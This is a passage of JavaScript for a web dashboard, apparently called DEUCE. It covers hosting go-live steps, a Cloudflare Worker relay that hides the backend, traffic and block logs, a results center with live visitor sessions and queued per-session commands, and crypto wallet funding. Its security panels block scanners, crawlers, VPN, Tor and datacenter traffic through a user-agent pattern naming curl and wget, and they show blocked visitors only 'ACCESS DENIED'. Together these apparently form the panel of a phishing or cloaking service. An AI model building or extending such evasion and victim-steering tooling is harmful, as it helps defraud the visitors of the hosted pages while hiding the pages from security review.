        <article class="security-panel package-form go-live-step-card ${hasRenderOrigin ? "is-complete" : hasDomain ? "is-active" : ""}">
          <small>step 2</small>
          <h3>Add raw host URL</h3>
          <p>Enter the raw URL from the static host where the downloaded index.html is uploaded. The live domain remains ${displayDomain}.</p>
          <label><span>Raw host URL</span><input type="url" data-hosting-field="serverIp" value="${serverIp}" placeholder="https://your-static-host.example.com"></label>
          <div class="admin-actions">
            <button type="button" data-save-hosting="${routeKey}">Save host URL</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${hasRelaySecret ? "is-complete" : hasDomain ? "is-active" : ""}">
          <small>step 3</small>
          <h3>Generate relay secret</h3>
          <p>This secret is stored in the Cloudflare Worker only. It lets your backend reject direct runtime traffic.</p>
          <div class="traffic-log">
            <div><span>01</span><strong>Secret</strong><em>${relaySecret ? "Saved" : "Needed"}</em><small>${relaySecret ? "Ready for Worker install." : "Generate before copying Worker code."}</small></div>
            <div><span>02</span><strong>Relay</strong><em>Hidden backend</em><small>Cloudflare forwards runtime calls privately.</small></div>
          </div>
          <div class="admin-actions">
            <button type="button" data-generate-relay-secret="${routeKey}">${relaySecret ? "Regenerate secret" : "Generate secret"}</button>
          </div>
        </article>

        <article class="security-panel package-form go-live-step-card ${hasWorkerRoute ? "is-complete" : hasRelaySecret ? "is-active" : ""}">
          <small>step 4</small>
          <h3>Install Cloudflare relay</h3>
          <p>Paste a limited Cloudflare token once. The app installs the Worker and route for <strong>${workerRoute}</strong>, then stores only deployment status.</p>
          <label><span>Cloudflare account ID</span><input type="text" data-cloudflare-field="accountId" value="${escapeHtml(cloudflare.accountId || "")}" placeholder="Account ID from Cloudflare dashboard"></label>
          <label><span>Cloudflare API token</span><input type="password" data-cloudflare-field="apiToken" value="" placeholder="Used once. Not saved by the app."></label>
          <label><span>Worker script name</span><input type="text" data-cloudflare-field="scriptName" value="${escapeHtml(cloudflare.scriptName || `deuce-${displayDomain.replace(/[^a-z0-9-]/gi, "-").toLowerCase()}`)}"></label>
          <div class="admin-code-sample">
            <code>Managed route: ${escapeHtml(cloudflare.routePattern || workerRoute)}</code>
            <code>Status: ${managedInstalled ? "Installed by app" : "Waiting for managed install"}</code>
            <code>Browser calls: https://${displayDomain}/api/*</code>
          </div>
          <div class="admin-actions">
            <button type="button" data-install-cloudflare="${routeKey}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
            <button type="button" data-verify-cloudflare="${routeKey}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
          </div>
          <details class="advanced-worker">
            <summary>Advanced manual Worker</summary>
            <p>Manual install is only for debugging. Managed install keeps normal users away from Worker code.</p>
            <textarea class="worker-code-box" readonly data-worker-code="${routeKey}">${escapeHtml(workerScript)}</textarea>
            <div class="admin-actions">
              <button type="button" data-copy-worker="${routeKey}" ${relaySecret ? "" : "disabled"}>Copy Worker script</button>
            </div>
          </details>
        </article>

        <article class="security-panel go-live-step-card ${hasVerified ? "is-complete" : hasWorkerRoute ? "is-active" : ""}">
          <small>step 5</small>
          <h3>Connect custom domain</h3>
          <p>Point ${displayDomain} to the static host. The raw host URL stays as the origin and should not be shared as the live link.</p>
          <div class="admin-rule-list">
            ${isRenderStatic ? `
              <div><strong>1</strong><span>Upload the generated index.html to your static host.</span></div>
              <div><strong>2</strong><span>Connect ${displayDomain} as the custom domain.</span></div>
              <div><strong>3</strong><span>In Cloudflare, keep the DNS record proxied so Worker route ${workerRoute} runs.</span></div>
              <div><strong>4</strong><span>The raw host URL is unauthorized by the generated page.</span></div>
            ` : `
              <div><strong>1</strong><span>Point the domain to the hosting account.</span></div>
              <div><strong>2</strong><span>Keep the Worker route active in Cloudflare.</span></div>
              <div><strong>3</strong><span>Visitors should open https://${displayDomain}/.</span></div>
              <div><strong>4</strong><span>Do not use alternate hostnames for the live page.</span></div>
            `}
          </div>
          <div class="admin-actions">
            <button type="button" data-verify-hosting="${routeKey}">Mark connection verified</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${page.generatedFile?.lastGeneratedAt ? "is-complete" : readyToDownload ? "is-active" : ""}">
          <small>step 6</small>
          <h3>Download final index.html</h3>
          <p>Download after the domain, relay secret, and Worker route are set. Upload only this file as index.html on the static host; the full page package stays controlled by DEUCE runtime.</p>
          <div class="admin-rule-list">
            ${isRenderStatic ? `
              <div><strong>1</strong><span>Download the generated index.html from this step.</span></div>
              <div><strong>2</strong><span>Upload or commit it to the static host root/publish folder.</span></div>
              <div><strong>3</strong><span>Connect ${domain || "clientdomain.com"} as the custom domain.</span></div>
              <div><strong>4</strong><span>Visitors must use ${domain || "clientdomain.com"} only. The raw host URL is treated as unauthorized.</span></div>
            ` : `
              <div><strong>1</strong><span>Download the generated index.html from this step.</span></div>
              <div><strong>2</strong><span>Go to ${installPath || "public_html"} or the domain document root.</span></div>
              <div><strong>3</strong><span>Upload the generated index.html. Visitors should open https://${domain || "clientdomain.com"}/.</span></div>
              <div><strong>4</strong><span>Add DirectoryIndex and /index.html redirect rules if the host exposes the filename.</span></div>
            `}
          </div>
          <div class="admin-actions">
            <button type="button" data-download-index="${routeKey}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} HOSTING SETUP READY`;
  topbarTitle.textContent = `${page.name} Go Live`;
}

function renderUserConfigCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const subscription = page.subscription || {};
  const hosting = page.hostingConfig || {};
  const resultSettings = page.resultSettings || {};
  const routeKey = pageRouteKey(page);
  const domain = hosting.domain || page.domain || "";
  const planLabel = subscription.billingPeriod ? billingLabel(subscription.billingPeriod) : "Not set";
  const renewalPrice = formatMoney(subscription.renewalPrice || 0);
  const renewalDate = subscription.renewalDate || "Not scheduled";
  const liveStatus = hosting.liveStatus || (hosting.verified ? "Live" : "Setup needed");

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>page config</small>
        <h2>${page.name} configuration</h2>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#security-${routeKey}:security`, "Security"),
        routeButton(`#results-${routeKey}`, "Results"),
        routeButton(`#go-live-${routeKey}`, "Go Live")
      ])}

      <div class="summary-grid config-summary">
        <article><small>Domain</small><b>${escapeHtml(domain || "Not set")}</b><span>Live host</span></article>
        <article><small>Plan</small><b>${escapeHtml(planLabel)}</b><span>${escapeHtml(renewalPrice)} renewal</span></article>
        <article><small>Renewal</small><b>${escapeHtml(renewalDate)}</b><span>${subscription.autoRenew ? "Auto-renew on" : "Auto-renew off"}</span></article>
        <article><small>Status</small><b>${escapeHtml(liveStatus)}</b><span>${page.securityConfig?.captcha ? "Captcha on" : "Captcha off"}</span></article>
      </div>

      <div class="package-editor-grid">
        <article class="security-panel package-form">
          <small>domain</small>
          <h3>Page identity</h3>
          <label><span>Primary domain</span><input type="text" data-user-config="domain" value="${escapeHtml(domain)}" placeholder="clientdomain.com"></label>
          <p>This domain is used for the hosted page and allowed-host security checks.</p>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${routeKey}">Save config</button>
            <button type="button" data-go-live="${routeKey}">Go Live</button>
          </div>
        </article>

        <article class="security-panel package-form">
          <small>subscription</small>
          <h3>Renewal behavior</h3>
          <label class="toggle-row">
            <input type="checkbox" data-user-config="autoRenew" ${subscription.autoRenew ? "checked" : ""}>
            <span>Auto-renew from wallet</span>
          </label>
          <div class="feature-row">
            <span>${escapeHtml(planLabel)}</span>
            <span>${escapeHtml(renewalPrice)}</span>
            <span>${escapeHtml(renewalDate)}</span>
          </div>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${routeKey}">Save renewal</button>
            <button type="button" data-route="#wallet">Wallet</button>
          </div>
        </article>

        <article class="security-panel package-form">
          <small>results</small>
          <h3>Result handling</h3>
          <label><span>Keep results for</span><input type="number" min="1" data-user-config="retentionDays" value="${escapeHtml(resultSettings.retentionDays || 30)}"></label>
          <label class="toggle-row">
            <input type="checkbox" data-user-config="notifyOnResult" ${resultSettings.notifyOnResult ? "checked" : ""}>
            <span>Notify me when a new result arrives</span>
          </label>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${routeKey}">Save results</button>
            <button type="button" data-results="${routeKey}">Open results</button>
          </div>
        </article>

        <article class="security-panel package-form">
          <small>quick controls</small>
          <h3>Page operations</h3>
          <div class="admin-compact-grid">
            <button type="button" data-security="${routeKey}" data-security-tab="security"><strong>Security</strong><span>Captcha and device rules</span></button>
            <button type="button" data-security="${routeKey}" data-security-tab="traffic"><strong>Traffic</strong><span>Visits and blocks</span></button>
            <button type="button" data-results="${routeKey}"><strong>Results</strong><span>Submissions and sessions</span></button>
            <button type="button" data-go-live="${routeKey}"><strong>Go Live</strong><span>Hosting and download</span></button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} USER CONFIG READY`;
  topbarTitle.textContent = `${page.name} Config`;
}

function formatTrafficTime(value) {
  if (!value) return "--";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return String(value).slice(0, 12);
  return date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
}

function formatTrafficDate(value) {
  if (!value) return "unknown date";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return String(value).slice(0, 16);
  return date.toLocaleDateString([], { month: "short", day: "numeric" });
}

const trafficDeviceLabels = {
  mobile: "Mobile",
  desktop: "PC",
  tablet: "Tablet",
  bot: "Bot / crawler",
  other: "Other"
};

function detectTrafficDeviceType(event = {}) {
  const storedType = event.metadata?.deviceType || event.deviceType;
  if (trafficDeviceLabels[storedType]) return storedType;
  const agent = String(event.userAgent || "").toLowerCase();
  if (!agent) return "other";
  if (/bot|crawler|spider|slurp|headless|preview|scanner|curl|wget|python-requests|httpclient/.test(agent)) return "bot";
  if (/ipad|tablet|kindle|silk|playbook/.test(agent)) return "tablet";
  if (/mobi|android|iphone|ipod|phone|blackberry|opera mini|windows phone/.test(agent)) return "mobile";
  if (/windows nt|macintosh|linux x86_64|x11|cros/.test(agent)) return "desktop";
  return "other";
}

function trafficInsights(trafficLog = []) {
  const counts = { mobile: 0, desktop: 0, tablet: 0, bot: 0, other: 0 };
  const buckets = new Map();
  let allowed = 0;
  let blocked = 0;

  trafficLog.forEach((event) => {
    const deviceType = detectTrafficDeviceType(event);
    counts[deviceType] = (counts[deviceType] || 0) + 1;
    if (event.result === "blocked") blocked += 1;
    else allowed += 1;

    const date = new Date(event.createdAt || event.time);
    if (Number.isNaN(date.getTime())) return;
    const hour = new Date(date);
    hour.setMinutes(0, 0, 0);
    const key = hour.toISOString();
    const label = hour.toLocaleTimeString([], { hour: "2-digit" });
    const current = buckets.get(key) || { key, label, total: 0 };
    current.total += 1;
    buckets.set(key, current);
  });

  const graph = [...buckets.values()]
    .sort((a, b) => a.key.localeCompare(b.key))
    .slice(-10);
  const maxGraphValue = Math.max(1, ...graph.map((bucket) => bucket.total));

  return {
    counts,
    allowed,
    blocked,
    graph,
    maxGraphValue,
    total: trafficLog.length
  };
}

function trafficCategoryCardsMarkup(insights) {
  return Object.entries(trafficDeviceLabels).map(([type, label]) => `
    <article class="traffic-category-card ${type}">
      <span>${escapeHtml(label)}</span>
      <strong>${insights.counts[type] || 0}</strong>
    </article>
  `).join("");
}

function trafficGraphMarkup(insights) {
  if (!insights.graph.length) {
    return `<div class="traffic-chart empty"><span>No graph data yet</span></div>`;
  }
  return `
    <div class="traffic-chart" aria-label="Traffic graph">
      ${insights.graph.map((bucket) => `
        <div class="traffic-bar" title="${escapeHtml(bucket.label)} / ${bucket.total}">
          <i style="height: ${Math.max(8, Math.round((bucket.total / insights.maxGraphValue) * 100))}%"></i>
          <span>${escapeHtml(bucket.label)}</span>
        </div>
      `).join("")}
    </div>
  `;
}

function trafficRowsMarkup(trafficLog, pageSlug, bannedIps = [], whitelistIps = []) {
  if (!trafficLog.length) {
    return `
      <article class="empty-state traffic-empty">
        <h3>No traffic yet</h3>
        <p>Open the live hosted page once, then return here. Visits, screens, allowed/blocked decisions, and IPs will appear in this panel.</p>
      </article>
    `;
  }

  return trafficLog.map((event) => {
    const ip = event.ip || "";
    const deviceType = detectTrafficDeviceType(event);
    const isBanned = bannedIps.includes(ip);
    const isWhitelisted = whitelistIps.includes(ip);
    const status = isBanned ? "Banned" : isWhitelisted ? "Whitelisted" : event.result || event.event || "Visit";
    return `
      <div>
        <span>${escapeHtml(formatTrafficTime(event.createdAt || event.time))}</span>
        <strong>${escapeHtml(ip || "unknown ip")}</strong>
        <mark class="traffic-device ${escapeHtml(deviceType)}">${escapeHtml(trafficDeviceLabels[deviceType] || "Other")}</mark>
        <em class="${isBanned ? "is-banned" : isWhitelisted ? "is-whitelisted" : ""}">${escapeHtml(status)}</em>
        <section class="traffic-actions" aria-label="Traffic IP actions">
          <button type="button" data-traffic-ban-ip="${escapeHtml(ip)}" data-traffic-page="${escapeHtml(pageSlug)}" ${ip && !isBanned ? "" : "disabled"}>Ban</button>
          <button type="button" data-traffic-whitelist-ip="${escapeHtml(ip)}" data-traffic-page="${escapeHtml(pageSlug)}" ${ip && !isWhitelisted ? "" : "disabled"}>Whitelist</button>
        </section>
        <small>${escapeHtml([
          event.event || "page_load",
          event.screen || event.path || "",
          event.hostname || "",
          formatTrafficDate(event.createdAt)
        ].filter(Boolean).join(" / "))}</small>
      </div>
    `;
  }).join("");
}

function pageLogStatus(event = {}) {
  const reason = String(event.reason || "").toLowerCase();
  if (event.result === "blocked" || reason.includes("blocked") || reason.includes("banned")) return "blocked";
  if (reason.includes("verified") || reason.includes("passed") || reason.includes("allowed") || reason.includes("whitelisted")) return "allowed";
  return event.result || "event";
}

function pageLogExplanation(event = {}) {
  const reason = String(event.reason || "").trim();
  const reasonLower = reason.toLowerCase();
  const deviceType = detectTrafficDeviceType(event);
  const deviceLabel = trafficDeviceLabels[deviceType] || "Other";
  const proxyType = event.metadata?.proxyType;
  const ip = event.ip || "unknown IP";

  if (reasonLower.includes("banned ip") || reasonLower.includes("ip blocked")) {
    return `Blocked because ${ip} is on this page's banned IP list.`;
  }
  if (reasonLower.includes("whitelisted")) {
    return `Allowed because ${ip} is on this page's whitelist.`;
  }
  if (reasonLower.includes("devices are blocked")) {
    return `Blocked because ${deviceLabel.toLowerCase()} traffic is disabled for this page.`;
  }
  if (reasonLower.includes("vpn") || reasonLower.includes("proxy")) {
    return `Blocked because the request looked like VPN or proxy traffic${proxyType ? ` (${proxyType})` : ""}.`;
  }
  if (reasonLower.includes("tor")) {
    return "Blocked because the request looked like Tor traffic.";
  }
  if (reasonLower.includes("hosting provider")) {
    return "Blocked because the request came from a hosting or datacenter network.";
  }
  if (reasonLower.includes("subscription")) {
    return "Blocked because the page subscription is not active.";
  }
  if (reasonLower.includes("turnstile") || reasonLower.includes("verified")) {
    return reasonLower.includes("passed") || reasonLower.includes("verified")
      ? "Human verification passed."
      : "Human verification did not pass.";
  }
  if (event.result === "blocked") {
    return reason && reason !== "ACCESS DENIED"
      ? `Blocked by page security: ${reason}.`
      : "Blocked by page security. Visitors only see ACCESS DENIED.";
  }
  if (event.event === "page_load") {
    return "Page loaded and the visitor passed the current access checks.";
  }
  if (event.event === "security_check") {
    return "Security check completed for this visitor.";
  }
  return reason && reason !== "ACCESS DENIED" ? reason : "Page activity recorded.";
}

function pageLogRowsMarkup(trafficLog) {
  if (!trafficLog.length) {
    return `
      <article class="empty-state traffic-empty">
        <h3>No page log yet</h3>
        <p>Open the hosted page once. Access checks, denied visits, device blocks, IP decisions, and verification events will appear here.</p>
      </article>
    `;
  }

  return trafficLog.map((event) => {
    const status = pageLogStatus(event);
    const deviceType = detectTrafficDeviceType(event);
    const detailLine = [
      event.ip || "unknown ip",
      trafficDeviceLabels[deviceType] || "Other",
      event.hostname || "unknown host",
      event.path || event.screen || event.event || "page event"
    ].filter(Boolean).join(" / ");
    return `
      <article class="page-log-entry ${escapeHtml(status)}">
        <time>${escapeHtml(formatTrafficTime(event.createdAt || event.time))}</time>
        <div>
          <strong>${escapeHtml(status === "blocked" ? "Access denied" : status === "allowed" ? "Allowed" : "Activity")}</strong>
          <p>${escapeHtml(pageLogExplanation(event))}</p>
          <small>${escapeHtml(detailLine)} / ${escapeHtml(formatTrafficDate(event.createdAt))}</small>
        </div>
      </article>
    `;
  }).join("");
}

function ipRuleRowsMarkup(ips = [], pageSlug, label) {
  if (!ips.length) {
    return `<p class="ip-rule-empty">No ${escapeHtml(label.toLowerCase())} saved yet.</p>`;
  }
  return `
    <div class="ip-rule-list">
      ${ips.map((ip) => `
        <div class="ip-rule-row">
          <strong>${escapeHtml(ip)}</strong>
          <button type="button" data-security-remove-ip="${escapeHtml(ip)}" data-security-page="${escapeHtml(pageSlug)}">Remove</button>
        </div>
      `).join("")}
    </div>
  `;
}

async function fetchPageTraffic(page) {
  try {
    const result = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/traffic?limit=100`);
    return result.trafficEvents || [];
  } catch (error) {
    statusText.textContent = `TRAFFIC LOAD FAILED: ${error.message}`.toUpperCase();
    return page.securityConfig?.trafficLog || [];
  }
}

async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
  activeFlowSlug = null;
  tab = tab === "domains" ? "security" : tab;
  tab = tab === "page-log" ? "log" : tab;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const routeKey = pageRouteKey(page);
  const security = page.securityConfig;
  const turnstile = security.turnstile || {};
  const bannedIps = security.bannedIps || [];
  const whitelistIps = security.whitelistIps || [];
  const blockedDevices = security.blockedDevices || [];
  const vpnProxyRules = security.vpnProxyRules || {};
  const trafficLog = ["traffic", "log"].includes(tab) ? await fetchPageTraffic(page) : security.trafficLog || [];
  const trafficStats = trafficInsights(trafficLog);
  const tabButtons = [
    routeButton(`#security-${routeKey}:security`, "Security", tab === "security" ? "primary" : ""),
    routeButton(`#security-${routeKey}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
    routeButton(`#security-${routeKey}:traffic`, "Traffic", tab === "traffic" ? "primary" : ""),
    routeButton(`#security-${routeKey}:log`, "Log", tab === "log" ? "primary" : "")
  ];
  const captchaPanel = `
    <article class="security-panel">
      <small>captcha</small>
      <h3>Cloudflare Turnstile</h3>
      <label class="toggle-row">
        <input type="checkbox" data-security-field="captcha" ${security.captcha ? "checked" : ""}>
        <span>Enable Turnstile challenge before form submission</span>
      </label>
      <label>
        <span>Turnstile site key</span>
        <input type="text" data-security-field="turnstileSiteKey" value="${escapeHtml(turnstile.siteKey || security.turnstileSiteKey || "")}" placeholder="0x4AAAA...">
      </label>
      <label>
        <span>Turnstile secret key</span>
        <input type="password" data-security-field="turnstileSecretKey" value="${escapeHtml(turnstile.secretKey || security.turnstileSecretKey || "")}" placeholder="Keep this server-side">
      </label>
      <p>The generated index.html receives only the site key. The secret key stays in your API config for verification.</p>
    </article>
  `;
  const ipPanel = `
    <article class="security-panel">
      <small>ip rules</small>
      <h3>Ban and whitelist</h3>
      <label>
        <span>Banned IPs</span>
        <textarea data-security-field="bannedIps">${bannedIps.join("\n")}</textarea>
      </label>
      ${ipRuleRowsMarkup(bannedIps, routeKey, "Banned IPs")}
      <label>
        <span>Whitelisted IPs</span>
        <textarea data-security-field="whitelistIps">${whitelistIps.join("\n")}</textarea>
      </label>
      ${ipRuleRowsMarkup(whitelistIps, routeKey, "Whitelisted IPs")}
      <button type="button" data-save-security="${routeKey}" data-save-security-tab="ips">Save IP rules</button>
    </article>
  `;
  const devicePanel = `
    <article class="security-panel">
      <small>device rules</small>
      <h3>Block device types</h3>
      <div class="device-rule-list">
        ${[
          ["mobile", "Mobile users", "Phones and small mobile browsers"],
          ["desktop", "PC users", "Windows, macOS, Linux desktop browsers"],
          ["tablet", "Tablet users", "iPad, Android tablets, Kindle/Silk"],
          ["bot", "Bots and scanners", "Crawler, spider, headless, scanner user agents"],
          ["other", "Other devices", "Unknown or unclassified user agents"]
        ].map(([value, label, hint]) => `
          <label class="device-rule">
            <input type="checkbox" data-security-device="${value}" ${blockedDevices.includes(value) ? "checked" : ""}>
            <span>
              <strong>${label}</strong>
              <small>${hint}</small>
            </span>
          </label>
        `).join("")}
      </div>
      <p>Best protection is server-side User-Agent detection through your runtime API. It blocks common device classes, but advanced users can spoof their browser, so pair this with IP rules and captcha for stronger control.</p>
      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save security rules</button>
    </article>
  `;
  const proxyPanel = `
    <article class="security-panel">
      <small>vpn / proxy shield</small>
      <h3>Block masked traffic</h3>
      <div class="device-rule-list">
        ${[
          ["blockVpnProxies", "Block VPN and proxy signals", "Blocks obvious proxy headers and proxy-like clients"],
          ["blockTor", "Block Tor exits", "Blocks Cloudflare Tor country signals and Tor-marked requests"],
          ["blockHostingProviders", "Block hosting/datacenter IPs", "Saved now; use IP reputation provider for strict enforcement"]
        ].map(([field, label, hint]) => `
          <label class="device-rule">
            <input type="checkbox" data-security-proxy="${field}" ${vpnProxyRules[field] ? "checked" : ""}>
            <span>
              <strong>${label}</strong>
              <small>${hint}</small>
            </span>
          </label>
        `).join("")}
      </div>
      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save shield</button>
    </article>
  `;
  const trafficPanel = `
    <article class="security-panel security-panel-wide">
      <div class="builder-heading">
        <div>
          <small>traffic</small>
          <h3>Visits and block counts</h3>
        </div>
        <button type="button" data-route="#security-${routeKey}:traffic">Refresh</button>
      </div>
      <div class="metric-grid">
        <div><span>Total events</span><b>${trafficStats.total}</b></div>
        <div><span>Allowed</span><b>${trafficStats.allowed}</b></div>
        <div><span>Blocked</span><b>${trafficStats.blocked}</b></div>
      </div>
      <div class="traffic-dashboard">
        <section class="traffic-category-grid" aria-label="Traffic categories">
          ${trafficCategoryCardsMarkup(trafficStats)}
        </section>
        ${trafficGraphMarkup(trafficStats)}
      </div>
      <div class="traffic-log">
        ${trafficRowsMarkup(trafficLog, routeKey, bannedIps, whitelistIps)}
      </div>
    </article>
  `;
  const pageLogPanel = `
    <article class="security-panel security-panel-wide">
      <div class="builder-heading">
        <div>
          <small>page log</small>
          <h3>What happened on this page</h3>
        </div>
        <button type="button" data-route="#security-${routeKey}:log">Refresh</button>
      </div>
      <p>This log explains the real owner-side reason behind page activity. Visitors still only see ACCESS DENIED when a rule blocks them.</p>
      <div class="metric-grid">
        <div><span>Total events</span><b>${trafficStats.total}</b></div>
        <div><span>Allowed</span><b>${trafficStats.allowed}</b></div>
        <div><span>Denied</span><b>${trafficStats.blocked}</b></div>
      </div>
      <div class="page-log-list">
        ${pageLogRowsMarkup(trafficLog)}
      </div>
    </article>
  `;
  const panels = tab === "traffic"
    ? trafficPanel
    : tab === "log"
        ? pageLogPanel
    : tab === "ips"
        ? ipPanel
        : `${captchaPanel}${devicePanel}${proxyPanel}`;

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>security center</small>
        <h2>${page.name} protection</h2>
        <p>Manage the rules that protect this page after users download and host the generated index.html.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#results-${routeKey}`, "Results"),
        routeButton("#wallet", "Wallet")
      ])}
      ${viewNav(tabButtons)}

      <div class="security-grid">
        ${panels}
      </div>
    </section>
  `;

  statusText.textContent = `${tab.toUpperCase()} RULES READY`;
  topbarTitle.textContent = `${page.name} Security`;
}

async function renderResultsCenter(pageSlug = "page-a", options = {}) {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const routeKey = pageRouteKey(page);
  const previousSearch = options.autoRefresh ? preview.querySelector("[data-session-search-input]")?.value || "" : "";
  const previousFilter = options.autoRefresh ? preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "live" : "live";
  const openSessionIds = options.autoRefresh
    ? [...preview.querySelectorAll("[data-compact-session][open]")]
        .map((row) => row.dataset.compactSession)
        .filter(Boolean)
    : [];
  await loadResultsControlData(page, options);
  if (options.autoRefresh && !isResultsRoute(routeKey)) return;
  const results = page.results || [];
  const savedSessions = resultSessions(results);
  const activeSessions = page.activeSessions || [];
  const activeSessionsById = new Map(activeSessions.map((session) => [session.sessionId, session]));
  const savedSessionIds = new Set(savedSessions.map((session) => session.sessionId));
  const activeSessionsWithoutResults = activeSessions.filter((session) => !savedSessionIds.has(session.sessionId));
  const compactSessions = [
    ...activeSessionsWithoutResults.map((session) => ({
      sessionId: session.sessionId,
      results: [],
      firstSeen: session.lastSeenAt,
      lastSeen: session.lastSeenAt,
      ip: session.ip || "unknown"
    })),
    ...savedSessions
  ];
  const sessionCommands = page.configs?.sessionCommands || {};
  const sessionCommandHistory = page.configs?.sessionCommandHistory || {};
  const bannedIps = page.securityConfig?.bannedIps || [];
  const whitelistIps = page.securityConfig?.whitelistIps || [];
  const pageTargets = sessionPageTargets(page);

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>page results</small>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#security-${routeKey}:security`, "Security"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="summary-grid">
        <article><small>Active users</small><b>${String(activeSessions.length).padStart(2, "0")}</b><span>Seen in last 10 minutes</span></article>
        <article><small>Total results</small><b>${String(results.length).padStart(2, "0")}</b><span>Saved for ${page.name}</span></article>
        <article><small>Banned IPs</small><b>${String(bannedIps.length).padStart(2, "0")}</b><span>Security list</span></article>
        <article><small>Whitelisted</small><b>${String(whitelistIps.length).padStart(2, "0")}</b><span>Trusted list</span></article>
      </div>

      ${resultStepCountMarkup(results)}

      <article class="security-panel compact-results-center">
        <div class="builder-heading">
          <div>
            <small>control center</small>
            <h3>Compact sessions</h3>
          </div>
          <div class="compact-center-actions">
            <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s</span>
            <button type="button" data-refresh-results="${routeKey}">Refresh</button>
            <button type="button" data-route="#security-${routeKey}:traffic">Open traffic</button>
          </div>
        </div>
        <div class="compact-session-toolbar">
          <input type="search" data-session-search-input placeholder="Search session, IP, page, command">
          <div class="compact-session-filters" aria-label="Filter result sessions">
            ${[
              ["all", "all"],
              ["live", "live"],
              ["queued", "queued"],
              ["delivered", "delivered"],
              ["blocked", "blocked"],
              ["offline", "offline"],
              ["has-results", "has results"],
              ["idle", "idle"]
            ].map(([filter, label]) => `
              <button type="button" class="${filter === previousFilter ? "is-active" : ""}" data-session-filter-button="${filter}">${label}</button>
            `).join("")}
          </div>
        </div>
        <div class="compact-session-list" data-compact-session-list>
          ${compactSessions.length ? compactSessions.map((session) => compactSessionMarkup(session, page, bannedIps, whitelistIps, {
            activeSession: activeSessionsById.get(session.sessionId),
            command: latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory),
            pageTargets
          })).join("") : `
            <article class="active-session-card empty-session">
              <div>
                <small>empty</small>
                <h4>No live sessions or saved results yet</h4>
                <p>Open the live page and keep it active; sessions and safe result activity will appear here.</p>
              </div>
            </article>
          `}
          <article class="active-session-card empty-session compact-session-empty" data-session-empty-state hidden>
            <div>
              <small>no match</small>
              <h4>No sessions match this view</h4>
              <p>Clear the search or choose another filter.</p>
            </div>
          </article>
        </div>
      </article>
    </section>
  `;

  if (previousSearch) {
    const searchInput = preview.querySelector("[data-session-search-input]");
    if (searchInput) searchInput.value = previousSearch;
  }
  if (previousFilter !== "all" || previousSearch) {
    applyCompactSessionFilters();
  }
  openSessionIds.forEach((sessionId) => {
    const row = preview.querySelector(`[data-compact-session="${CSS.escape(sessionId)}"]`);
    if (row) row.open = true;
  });

  startResultsAutoRefresh(routeKey);
  statusText.textContent = options.autoRefresh ? `${page.name.toUpperCase()} RESULTS AUTO-REFRESHED` : `${page.name.toUpperCase()} RESULTS READY`;
  topbarTitle.textContent = `${page.name} Results`;
}

function applyCompactSessionFilters() {
  const list = preview.querySelector("[data-compact-session-list]");
  if (!list) return;
  const activeFilter = preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "all";
  const search = (preview.querySelector("[data-session-search-input]")?.value || "").trim().toLowerCase();
  const rows = [...preview.querySelectorAll("[data-compact-session]")];
  let visibleCount = 0;

  rows.forEach((row) => {
    const status = (row.dataset.sessionFilter || "idle").split(/\s+/);
    const searchText = row.dataset.sessionSearch || "";
    const filterMatch = activeFilter === "all" || status.includes(activeFilter);
    const searchMatch = !search || searchText.includes(search);
    const visible = filterMatch && searchMatch;
    row.hidden = !visible;
    if (visible) visibleCount += 1;
  });

  const empty = preview.querySelector("[data-session-empty-state]");
  if (empty) empty.hidden = visibleCount > 0;
}

function walletFundingOptionByValue(value) {
  return walletFundingOptions.find((option) => option.value === value) || walletFundingOptions[0] || cryptoFundingOptions[0];
}

function walletFundingAddressMarkup(option) {
  const address = option?.address || "";
  return `
    <div class="wallet-address-card" data-wallet-address-card>
      <span>${escapeHtml(option?.label || "Crypto wallet")}</span>
      <code data-wallet-address>${address ? escapeHtml(address) : "Receiving address not configured"}</code>
      <button type="button" data-copy-wallet-address ${address ? "" : "disabled"}>Copy address</button>
    </div>
  `;
}

function walletFundingQuoteMarkup() {
  return `
    <div class="wallet-quote-card" data-wallet-quote>
      <span>Minimum funding is ${formatMoney(minimumWalletFundingUsd)}</span>
      <strong data-wallet-quote-amount>Enter an amount to calculate crypto.</strong>
      <small data-wallet-quote-rate>Quote updates from the backend before you submit.</small>
    </div>
  `;
}

function setWalletQuoteState(state, detail = "") {
  const card = preview.querySelector("[data-wallet-quote]");
  if (!card) return;
  const amount = card.querySelector("[data-wallet-quote-amount]");
